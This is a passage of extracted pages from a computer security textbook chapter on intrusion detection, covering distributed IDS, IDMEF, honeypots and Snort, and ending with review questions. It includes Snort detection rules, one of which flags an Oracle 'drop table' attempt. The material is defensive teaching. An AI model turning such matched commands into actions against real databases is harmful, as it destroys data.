       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 297, 'page_label': '296'}, page_content='296  CHAPTER 8 / InTRusIon DETECTIon\\nAn example of this approach is a scheme developed by Intel and referred to \\nas autonomic enterprise security [AGOS06]. Figure 8.6 illustrates the approach. This \\napproach does not rely solely on perimeter defense mechanisms, such as firewalls, or \\non individual host-based defenses. Instead, each end host and each network device \\n(e.g., routers) is considered to be a potential sensor and may have the sensor software \\nmodule installed. The sensors in this distributed configuration can exchange informa-\\ntion to corroborate the state of the network (i.e., whether an attack is under way).\\nThe Intel designers provide the following motivation for this approach:\\n1. IDSs deployed selectively may miss a network-based attack or may be slow to \\nrecognize that an attack is under way. The use of multiple IDSs that share infor-\\nmation has been shown to provide greater coverage and more rapid response to \\nattacks, especially slowly growing attacks (e.g., [BAIL05], [RAJA05]).\\n2. Analysis of network traffic at the host level provides an environment in which there \\nis much less network traffic than found at a network device such as a router. Thus, \\nattack patterns will stand out more, providing in effect a higher signal-to-noise ratio.\\n3. Host-based detectors can make use of a richer set of data, possibly using appli-\\ncation data from the host as input into the local classifier.\\nFigure 8.6 Overall Architecture of an Autonomic Enterprise Security System\\nPlatform\\npolicies\\nSummary\\nevents\\nPEP\\nevents\\nCollaborative\\npolicies\\nNetwork\\npoliciesPlatform\\npolicies\\nPlatform\\npolicies\\nPlatform\\nevents\\nPlatform\\nevents\\nDistributed detection\\nand inference\\nGossip\\nPEP = policy enforcement point\\nDDI = distributed detection and inference\\nDDI\\nevents\\nAdaptive feedback\\nbased policies\\nM08_STAL0611_04_GE_C08.indd   296 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 298, 'page_label': '297'}, page_content='8.7 / InTRusIon DETECTIon EXCHAnGE FoRMAT  297\\nNIST SP 800-94 notes that a distributed or hybrid IDS can be constructed using \\nmultiple products from a single vendor, designed to share and exchange data. This is \\nclearly an easier, but may not be the most cost-effective or comprehensive solution. \\nAlternatively, specialized security information and event management (SIEM) soft-\\nware exists that can import and analyze data from a variety of sources, sensors, and \\nproducts. Such software may well rely on standardized protocols, such as Intrusion \\nDetection Exchange Format we will discuss in the next section. An analogy may help \\nclarify the advantage of this distributed approach. Suppose a single host is subject to \\na prolonged attack, and the host is configured to minimize false positives. Early on in \\nthe attack, no alert is sounded because the risk of false positive is high. If the attack \\npersists, the evidence that an attack is under way becomes stronger and the risk of \\nfalse positive decreases. However, much time has passed. Now, consider many local \\nsensors, each of which suspect the onset of an attack and all of which collaborate. \\nBecause numerous systems see the same evidence, an alert can be issued with a low \\nfalse positive risk. Thus, instead of a long period of time, we use a large number of \\nsensors to reduce false positives and still detect attacks. A number of vendors now \\noffer this type of product.\\nWe now summarize the principal elements of this approach, illustrated in  \\nFigure 8.6. A central system is configured with a default set of security policies. Based \\non input from distributed sensors, these policies are adapted and specific actions are \\ncommunicated to the various platforms in the distributed system. The device-specific \\npolicies may include immediate actions to take or parameter settings to be adjusted. \\nThe central system also communicates collaborative policies to all platforms that \\nadjust the timing and content of collaborative gossip messages. Three types of input \\nguide the actions of the central system:\\n• Summary events: Events from various sources are collected by intermediate \\ncollection points such as firewalls, IDSs, or servers that serve a specific seg -\\nment of the enterprise network. These events are summarized for delivery to \\nthe central policy system.\\n• DDI events: Distributed detection and inference (DDI) events are alerts that \\nare generated when the gossip traffic enables a platform to conclude that an \\nattack is under way.\\n• PEP events: Policy enforcement points (PEPs) reside on trusted, self-defending \\nplatforms and intelligent IDSs. These systems correlate distributed information, \\nlocal decisions, and individual device actions to detect intrusions that may not \\nbe evident at the host level.\\n 8.7 INTRUSION DETECTION EXCHANGE FORMAT\\nTo facilitate the development of distributed IDSs that can function across a wide \\nrange of platforms and environments, standards are needed to support interoper -\\nability. Such standards are the focus of the IETF Intrusion Detection Working Group. \\nThe purpose of the working group is to define data formats and exchange procedures \\nfor sharing information of interest to intrusion detection and response systems and to \\nM08_STAL0611_04_GE_C08.indd   297 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 299, 'page_label': '298'}, page_content='298  CHAPTER 8 / InTRusIon DETECTIon\\nmanagement systems that may need to interact with them. The working group issued \\nthe following RFCs in 2007:\\n• Intrusion Detection Message Exchange Requirements (RFC 4766): This docu-\\nment defines requirements for the Intrusion Detection Message Exchange For-\\nmat (IDMEF). The document also specifies requirements for a communication \\nprotocol for communicating IDMEF.\\n• The Intrusion Detection Message Exchange Format (RFC 4765): This document \\ndescribes a data model to represent information exported by intrusion detection \\nsystems and explains the rationale for using this model. An implementation of \\nthe data model in the Extensible Markup Language (XML) is presented, an \\nXML Document Type Definition is developed, and examples are provided.\\n• The Intrusion Detection Exchange Protocol (RFC 4767):  This document \\ndescribes the Intrusion Detection Exchange Protocol (IDXP), an application-\\nlevel protocol for exchanging data between intrusion detection entities. IDXP \\nsupports mutual-authentication, integrity, and confidentiality over a connec -\\ntion-oriented protocol.\\nFigure 8.7 illustrates the key elements of the model on which the intrusion \\ndetection message exchange approach is based. This model does not correspond to \\nFigure 8.7 Model for Intrusion Detection Message Exchange\\nResponse\\nActivity\\nEvent\\nEvent\\nAlert\\nNotification\\nOperator\\nAdministrator\\nSecurity\\npolicy\\nSecurity\\npolicy\\nM08_STAL0611_04_GE_C08.indd   298 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 300, 'page_label': '299'}, page_content='8.7 / InTRusIon DETECTIon EXCHAnGE FoRMAT  299\\nany particular product or implementation, but its functional components are the key \\nelements of any IDS. The functional components are as follows:\\n• Data source: The raw data that an IDS uses to detect unauthorized or undesired \\nactivity. Common data sources include network packets, operating system audit \\nlogs, application audit logs, and system-generated checksum data.\\n• Sensor: Collects data from the data source. The sensor forwards events to the \\nanalyzer.\\n• Analyzer: The ID component or process that analyzes the data collected by the \\nsensor for signs of unauthorized or undesired activity or for events that might \\nbe of interest to the security administrator. In many existing IDSs, the sensor \\nand the analyzer are part of the same component.\\n• Administrator: The human with overall responsibility for setting the security \\npolicy of the organization, and, thus, for decisions about deploying and config-\\nuring the IDS. This may or may not be the same person as the operator of the \\nIDS. In some organizations, the administrator is associated with the network \\nor systems administration groups. In other organizations, it is an independent \\nposition.\\n• Manager: The ID component or process from which the operator manages the \\nvarious components of the ID system. Management functions typically include \\nsensor configuration, analyzer configuration, event notification management, \\ndata consolidation, and reporting.\\n• Operator: The human that is the primary user of the IDS manager. The opera-\\ntor often monitors the output of the IDS and initiates or recommends further \\naction.\\nIn this model, intrusion detection proceeds in the following manner. The sen -\\nsor monitors data sources looking for suspicious activity, such as network sessions \\nshowing unexpected remote access activity, operating system log file entries showing \\na user attempting to access files to which he or she is not authorized to have access, \\nand application log files showing persistent login failures. The sensor communicates \\nsuspicious activity to the analyzer as an event, which characterizes an activity within \\na given period of time. If the analyzer determines that the event is of interest, it sends \\nan alert to the manager component that contains information about the unusual \\nactivity that was detected, as well as the specifics of the occurrence. The manager \\ncomponent issues a notification to the human operator. A response can be initiated \\nautomatically by the manager component or by the human operator. Examples of \\nresponses include logging the activity; recording the raw data (from the data source) \\nthat characterized the event; terminating a network, user, or application session; or \\naltering network or system access controls. The security policy is the predefined, for-\\nmally documented statement that defines what activities are allowed to take place \\non an organization’s network or on particular hosts to support the organization’s \\nrequirements. This includes, but is not limited to, which hosts are to be denied external \\nnetwork access.\\nThe specification defines formats for event and alert messages, message types, \\nand exchange protocols for communication of intrusion detection information.\\nM08_STAL0611_04_GE_C08.indd   299 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 301, 'page_label': '300'}, page_content='300  CHAPTER 8 / InTRusIon DETECTIon\\n 8.8 HONEYPOTS\\nA further component of intrusion detection technology is the honeypot. Honeypots \\nare decoy systems that are designed to lure a potential attacker away from critical \\nsystems. Honeypots are designed to:\\n• Divert an attacker from accessing critical systems.\\n• Collect information about the attacker’s activity.\\n• Encourage the attacker to stay on the system long enough for administrators \\nto respond.\\nThese systems are filled with fabricated information designed to appear valu -\\nable but that a legitimate user of the system would not access. Thus, any access to the \\nhoneypot is suspect. The system is instrumented with sensitive monitors and event \\nloggers that detect these accesses and collect information about the attacker’s activi-\\nties. Because any attack against the honeypot is made to seem successful, adminis -\\ntrators have time to mobilize and log and track the attacker without ever exposing \\nproductive systems.\\nThe honeypot is a resource that has no production value. There is no legiti -\\nmate reason for anyone outside the network to interact with a honeypot. Thus, any \\nattempt to communicate with the system is most likely a probe, scan, or attack. Con-\\nversely, if a honeypot initiates outbound communication, the system has probably \\nbeen compromised.\\nHoneypots are typically classified as being either low or high interaction.\\n• Low interaction hone ypot: Consists of a software package that emulates \\n particular IT services or systems well enough to provide a r ealistic initial \\n interaction, but does not execute a full version of those services or systems.\\n• High interaction honeypot: Is a real system, with a full operating system, \\n services and applications,  which are instrumented and deployed where they \\ncan be accessed by attackers.\\nA high interaction honeypot is a more realistic target that may occupy an \\nattacker for an extended period. However, it requires significantly more resources, \\nand if compromised could be used to initiate attacks on other systems. This may result \\nin unwanted legal or reputational issues for the organization running it. A low interac-\\ntion honeypot provides a less realistic target, able to identify intruders using the ear-\\nlier stages of the attack methodology we discussed earlier in this chapter. This is often \\nsufficient for use as a component of a distributed IDS to warn of imminent attack. \\n“The Honeynet Project” provides a range of resources and packages for such systems.\\nInitial efforts involved a single honeypot computer with IP addresses designed \\nto attract hackers. More recent research has focused on building entire honeypot net-\\nworks that emulate an enterprise, possibly with actual or simulated traffic and data. \\nOnce hackers are within the network, administrators can observe their behavior in \\ndetail and figure out defenses.\\nHoneypots can be deployed in a variety of locations. Figure 8.8 illustrates \\nsome possibilities. The location depends on a number of factors, such as the type \\nM08_STAL0611_04_GE_C08.indd   300 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 302, 'page_label': '301'}, page_content='8.8 / HonEYPoTs  301\\nof information the organization is interested in gathering and the level of risk that \\norganizations can tolerate to obtain the maximum amount of data.\\nA honeypot outside the external firewall (location 1) is useful for tracking \\nattempts to connect to unused IP addresses within the scope of the network. A hon-\\neypot at this location does not increase the risk for the internal network. The danger \\nof having a compromised system behind the firewall is avoided. Further, because the \\nhoneypot attracts many potential attacks, it reduces the alerts issued by the firewall \\nand by internal IDS sensors, easing the management burden. The disadvantage of an \\nexternal honeypot is that it has little or no ability to trap internal attackers, especially \\nif the external firewall filters traffic in both directions.\\nThe network of externally available services, such as Web and mail, often called \\nthe DMZ (demilitarized zone), is another candidate for locating a honeypot (location\\xa02). \\nThe security administrator must assure that the other systems in the DMZ are secure \\nagainst any activity generated by the honeypot. A disadvantage of this location is that a \\ntypical DMZ is not fully accessible, and the firewall typically blocks traffic to the DMZ \\nFigure 8.8 Example of Honeypot Deployment\\nInternet\\nHoneypot\\nHoneypot\\n1\\n3\\nHoneypot\\nService network\\n(Web, mail, DNS, etc.)\\nInternal\\nnetwork\\nExternal\\nﬁrewall\\nLAN switch\\nor router\\nLAN switch\\nor router\\n2\\nM08_STAL0611_04_GE_C08.indd   301 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 303, 'page_label': '302'}, page_content='302  CHAPTER 8 / InTRusIon DETECTIon\\nthe attempts to access unneeded services. Thus, the firewall either has to open up the traf-\\nfic beyond what is permissible, which is risky, or limit the effectiveness of the honeypot.\\nA fully internal honeypot (location 3) has several advantages. Its most important \\nadvantage is that it can catch internal attacks. A honeypot at this location can also \\ndetect a misconfigured firewall that forwards impermissible traffic from the Internet \\nto the internal network. There are several disadvantages. The most serious of these is if \\nthe honeypot is compromised so it can attack other internal systems. Any further traffic \\nfrom the Internet to the attacker is not blocked by the firewall because it is regarded \\nas traffic to the honeypot only. Another difficulty for this honeypot location is that, as \\nwith location 2, the firewall must adjust its filtering to allow traffic to the honeypot, thus \\ncomplicating firewall configuration and potentially compromising the internal network.\\nAn emerging related technology is the use of honeyfiles, that emulate legiti -\\nmate documents with realistic, enticing names and possibly content. These docu -\\nments should not be accessed by legitimate users of a system, but rather act as bait \\nfor intruders exploring a system. Any access of them is assumed to be suspicious \\n[WHIT13]. Appropriate generation, placement, and monitoring of honeyfiles is an \\narea of current research.\\n 8.9 EXAMPLE SYSTEM: SNORT\\nSnort is an open source, highly configurable and portable host-based or network-based \\nIDS. Snort is referred to as a lightweight IDS, which has the following characteristics:\\n• Easily deployed on most nodes (host, server, router) of a network.\\n• Efficient operation that uses small amount of memory and processor time.\\n• Easily configured by system administrators who need to implement a specific \\nsecurity solution in a short amount of time.\\nSnort can perform real-time packet capture, protocol analysis, and content search -\\ning and matching. Snort is mainly designed to analyze TCP , UDP , and ICMP net -\\nwork protocols, though it can be extended with plugins for other protocols. Snort can \\ndetect a variety of attacks and probes, based on a set of rules configured by a system \\nadministrator.\\nSnort Architecture\\nA Snort installation consists of four logical components (see Figure 8.9):\\n• Packet decoder: The packet decoder processes each captured packet to identify \\nand isolate protocol headers at the data link, network, transport, and applica -\\ntion layers. The decoder is designed to be as efficient as possible and its primary \\nwork consists of setting pointers so that the various protocol headers can be \\neasily extracted.\\n• Detection engine:  The detection engine does the actual work of intrusion \\ndetection. This module analyzes each packet based on a set of rules defined \\nfor this configuration of Snort by the security administrator. In essence, each \\npacket is checked against all the rules to determine if the packet matches the \\nM08_STAL0611_04_GE_C08.indd   302 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 304, 'page_label': '303'}, page_content='8.9 / EXAMPLE sYsTEM: snoRT  303\\ncharacteristics defined by a rule. The first rule that matches the decoded packet \\ntriggers the action specified by the rule. If no rule matches the packet, the detec-\\ntion engine discards the packet.\\n• Logger: For each packet that matches a rule, the rule specifies what logging \\nand alerting options are to be taken. When a logger option is selected, the log-\\nger stores the detected packet in human readable format or in a more compact \\nbinary format in a designated log file. The security administrator can then use \\nthe log file for later analysis.\\n• Alerter: For each detected packet, an alert can be sent. The alert option in the \\nmatching rule determines what information is included in the event notification. \\nThe event notification can be sent to a file, to a UNIX socket, or to a database. \\nAlerting may also be turned off during testing or penetration studies. Using \\nthe UNIX socket, the alert can be sent to a management machine elsewhere \\non the network.\\nA Snort implementation can be configured as a passive sensor, which moni -\\ntors traffic but is not in the main transmission path of the traffic, or an inline sen -\\nsor, through which all packet traffic must pass. In the latter case, Snort can perform \\nintrusion prevention as well as intrusion detection. We defer a discussion of intrusion \\nprevention to Chapter 9.\\nSnort Rules\\nSnort uses a simple, flexible rule definition language that generates the rules used by \\nthe detection engine. Although the rules are simple and straightforward to write, they \\nare powerful enough to detect a wide variety of hostile or suspicious traffic.\\nEach rule consists of a fixed header and zero or more options (see Figure 8.10). \\nThe header has the following elements:\\n• Action: The rule action tells Snort what to do when it finds a packet that matches \\nthe rule criteria. Table 8.3 lists the available actions. The last three actions in the \\nlist (drop, reject, sdrop) are only available in inline mode.\\nFigure 8.9 Snort Architecture\\nPacket Decoder Detection\\nengine\\nLog\\nAlert\\nM08_STAL0611_04_GE_C08.indd   303 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 305, 'page_label': '304'}, page_content='304  CHAPTER 8 / InTRusIon DETECTIon\\n• Protocol: Snort proceeds in the analysis if the packet protocol matches this \\nfield. The current version of Snort (2.9) recognizes four protocols: TCP , UDP , \\nICMP , and IP . Future releases of Snort will support a greater range of protocols.\\n• Source IP address: Designates the source of the packet. The rule may specify a \\nspecific IP address, any IP address, a list of specific IP addresses, or the negation \\nof a specific IP address or list. The negation indicates that any IP address other \\nthan those listed is a match.\\n• Source port: This field designates the source port for the specified protocol (e.g., \\na TCP port). Port numbers may be specified in a number of ways, including \\nspecific port number, any ports, static port definitions, ranges, and by negation.\\n• Direction: This field takes on one of two values: unidirectional (- 7) or bidi-\\nrectional (6 - 7). The bidirectional option tells Snort to consider the address/\\nport pairs in the rule as either source followed by destination or destination \\nfollowed by source. The bidirectional option enables Snort to monitor both \\nsides of a conversation.\\n• Destination IP address: Designates the destination of the packet.\\n• Destination port: Designates the destination port.\\nFollowing the rule header may be one or more rule options. Each option con-\\nsists of an option keyword, which defines the option; followed by arguments, which \\nspecify the details of the option. In the written form, the set of rule options is sep -\\narated from the header by being enclosed in parentheses. Snort rule options are \\nAction Description\\nalert Generate an alert using the selected alert method, and then log the packet.\\nlog Log the packet.\\npass Ignore the packet.\\nactivate Alert and then turn on another dynamic rule.\\ndynamic Remain idle until activated by an activate rule, then act as a log rule.\\ndrop Make iptables drop the packet and log the packet.\\nreject Make iptables drop the packet, log it, then send a TCP reset if the protocol is \\nTCP or an ICMP port unreachable message if the protocol is UDP .\\nsdrop Make iptables drop the packet but does not log it.\\nTable 8.3 Snort Rule Actions\\nFigure 8.10 Snort Rule Formats\\nAction Protocol Source  \\nIP address\\nSource \\nport\\nDirection Dest  \\nIP address\\nDest port\\nOption \\nkeyword\\nOption \\narguments \\xa0.\\xa0\\xa0.\\xa0\\xa0.\\xa0\\n(a) Rule header\\n(b) Options\\nM08_STAL0611_04_GE_C08.indd   304 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 306, 'page_label': '305'}, page_content='8.9 / EXAMPLE sYsTEM: snoRT  305\\nseparated from each other using the semicolon (;) character. Rule option keywords \\nare separated from their arguments with a colon (:) character.\\nThere are four major categories of rule options:\\n• Meta-data: Provide information about the rule but do not have any affect dur-\\ning detection.\\n• Payload: Look for data inside the packet payload and can be interrelated.\\n• Non-payload: Look for non-payload data.\\n• Post-detection: Rule-specific triggers that happen after a rule has matched a \\npacket.\\nTable 8.4 provides examples of options in each category.\\nmeta-data\\nmsg Defines the message to be sent when a packet generates an event.\\nreference Defines a link to an external attack identification system, which provides additional \\ninformation.\\nclasstype Indicates what type of attack the packet attempted.\\npayload\\ncontent Enables Snort to perform a case-sensitive search for specific content (text and/or \\nbinary) in the packet payload.\\ndepth Specifies how far into a packet Snort should search for the specified pattern. Depth \\nmodifies the previous content keyword in the rule.\\noffset Specifies where to start searching for a pattern within a packet. Offset modifies the \\nprevious content keyword in the rule.\\nnocase Snort should look for the specific pattern, ignoring case. Nocase modifies the previ-\\nous content keyword in the rule.\\nnon-payload\\nttl Check the IP time-to-live value. This option was intended for use in the detection of \\ntraceroute attempts.\\nid Check the IP ID field for a specific value. Some tools (exploits, scanners and other \\nodd programs) set this field specifically for various purposes, for example, the value \\n31337 is very popular with some hackers.\\ndsize Test the packet payload size. This may be used to check for abnormally sized packets. \\nIn many cases, it is useful for detecting buffer overflows.\\nflags Test the TCP flags for specified settings.\\nseq Look for a specific TCP header sequence number.\\nicmp-id Check for a specific ICMP ID value. This is useful because some covert channel pro-\\ngrams use static ICMP fields when they communicate. This option was developed to \\ndetect the stacheldraht DDoS agent.\\npost-detection\\nlogto Log packets matching the rule to the specified filename.\\nsession Extract user data from TCP Sessions. There are many cases where seeing what users \\nare typing in telnet, rlogin, ftp, or even web sessions is very useful.\\nTable 8.4 Examples of Snort Rule Options\\nM08_STAL0611_04_GE_C08.indd   305 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 307, 'page_label': '306'}, page_content='306  CHAPTER 8 / InTRusIon DETECTIon\\nHere is an example of a Snort rule:\\nAlert tcp $EXTERNAL_NET any -> $HOME_NET any\\\\\\n(msg: “SCAN SYN FIN” flags: SF, 12;\\\\\\nreference: arachnids, 198; classtype: attempted-recon;)\\nIn Snort, the reserved backslash character “\\\\” is used to write instructions on \\nmultiple lines. This example is used to detect a type of attack at the TCP level known \\nas a SYN-FIN attack. The names $EXTERNAL_NET and $HOME_NET are pre-\\ndefined variable names to specify particular networks. In this example, any source \\nport or destination port is specified. This example checks if just the SYN and the FIN \\nbits are set, ignoring reserved bit 1 and reserved bit 2 in the flags octet. The reference \\noption refers to an external definition of this attack, which is of type attempted-recon.\\n 8.10 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\nKey Terms\\nanomaly detection\\nbanner grabbing\\nbase-rate fallacy\\nfalse negative\\nfalse positive\\nhacker\\nhoneypot\\nhost-based IDS\\ninline sensor\\nintruder\\nintrusion detection\\nintrusion detection exchange \\nformat\\nintrusion detection system \\n(IDS)\\nnetwork-based IDS (NIDS)\\nnetwork sensor\\npassive sensor\\nrule-based anomaly detection\\nrule-based heuristic \\nidentification\\nrule-based penetration\\nidentification\\nsecurity intrusion\\nscanning\\nsignature approaches\\nsignature detection\\nSnort\\nReview Questions\\n 8.1 List and briefly define the skill level of intruders.\\n 8.2 List five examples of intrusion.\\n 8.3 How are intruders classified according to skill level?\\n 8.4 What is meant by security intrusion?\\n 8.5 List and breifly describe the classifications of intrusion detection systems based on the \\nsource and the type of data analyzed.\\n 8.6 What are three benefits that can be provided by an IDS?\\n 8.7 What is the difference between a false positive and a false negative in the context of \\nan IDS?\\n 8.8 Explain the base-rate fallacy.\\n 8.9 List some desirable characteristics of an IDS.\\n 8.10 What is the difference between anomaly detection and signature or heuristic intrusion \\ndetection?\\nM08_STAL0611_04_GE_C08.indd   306 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 308, 'page_label': '307'}, page_content='8.10 / KEY TERMs, REVIEW QuEsTIons, AnD PRoBLEMs  307\\n 8.11 List and briefly define the three broad categories of classification approaches used by \\nanomaly detection systems.\\n 8.12 List the advantages of using machine-learning approaches for anomaly detection.\\n 8.13 What is the difference between signature detection and rule-based heuristic identification?\\n 8.14 What is the major advantage of HIDS over NIDSs and firewalls?\\n 8.15 Which of anomaly HIDS or signatur e and heuristic HIDS are currently more com -\\nmonly deployed? Why?\\n 8.16 What advantages do a Distributed HIDS provide over a single system HIDS?\\n 8.17 Describe the types of sensors that can be used in a NIDS.\\n 8.18 What are the advantages of locating the NIDS sensor inside the external firewall?\\n 8.19 Are either anomaly detection or signature and heuristic detection techniques or both \\nused in NIDS?\\n 8.20 What are some motivations for using a distributed or hybrid IDS?\\n 8.21 What is SNORT? What are the logical components of a SNORT installation?\\n 8.22 List four logical components of Snort architecture.\\nProblems\\n 8.1 Consider the first step of the common attack methodology we describe, which is to \\ngather publicly available information on possible targets. What types of information \\ncould be used? What does this use suggest to you about the content and detail of \\nsuch information? How does this correlate with the organization’s business and legal \\nrequirements? How do you reconcile these conflicting demands?\\n 8.2 In the context of an IDS, we define a false positive to be an alarm generated by an IDS \\nin which the IDS alerts to a condition that is actually benign. A false negative occurs \\nwhen an IDS fails to generate an alarm when an alert-worthy condition is in effect. \\nUsing the following diagram, depict two curves that roughly indicate false positives \\nand false negatives, respectively:\\nFrequency\\nof alerts\\nLess specif ic\\nor looser\\nConservativeness\\nof signatures\\nMore specif ic\\nor stricter\\n 8.3 Inline sensors are inserted into a network segment so that the traffic being monitored \\npasses through them. These sensors perform both intrusion detection and intrusion \\nprevention functions. However, passive sensors are more commonly used. Why?\\nM08_STAL0611_04_GE_C08.indd   307 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 309, 'page_label': '308'}, page_content='308  CHAPTER 8 / InTRusIon DETECTIon\\n 8.4 One of the non-payload options in Snort is flow . This option distinguishes between \\nclients and servers. This option can be used to specify a match only for packets flow -\\ning in one direction (client to server or vice-versa) and can specify a match only on \\nestablished TCP connections. Consider the following Snort rule:\\nalert tcp $EXTERNAL_NET any -> $SQL_SERVERS $ORACLE_PORTS\\\\\\n(msg: “ORACLE drop table attempt:;\\\\\\nflow: to_server, established; content: “drop table_name”; \\nnocase;\\\\\\nclasstype: protocol-command-decode;)\\na. What does this rule do?\\nb. Comment on the significance of this rule if the Snort devices is placed inside or \\noutside of the external firewall.\\n 8.5 The overlapping ar ea of the two probability density functions of Figure 8.1 repre -\\nsents the region in which there is the potential for false positives and false negatives. \\n Further, Figure 8.1 is an idealized and not necessarily representative depiction of the \\nrelative shapes of the two density functions. Suppose there is 1 actual intrusion for \\nevery 1000 authorized users, and the overlapping area covers 1% of the authorized \\nusers and 50% of the intruders.\\na. Sketch such a set of density functions and ar gue that this is not an unreasonable \\ndepiction.\\nb. What is the probability that an event that occurs in this region is that of an autho-\\nrized user? Keep in mind that 50% of all intrusions fall in this region.\\n 8.6 An example of a host-based intrusion detection tool is the tripwire pr ogram. This is \\na file integrity checking tool that scans files and directories on the system on a regu -\\nlar basis and notifies the administrator of any changes. It uses a protected database \\nof cryptographic checksums for each file checked and compares this value with that \\nrecomputed on each file as it is scanned. It must be configured with a list of files and \\ndirectories to check and what changes, if any, are permissible to each. It can allow, \\nfor example, log files to have new entries appended, but not for existing entries to be \\nchanged. What are the advantages and 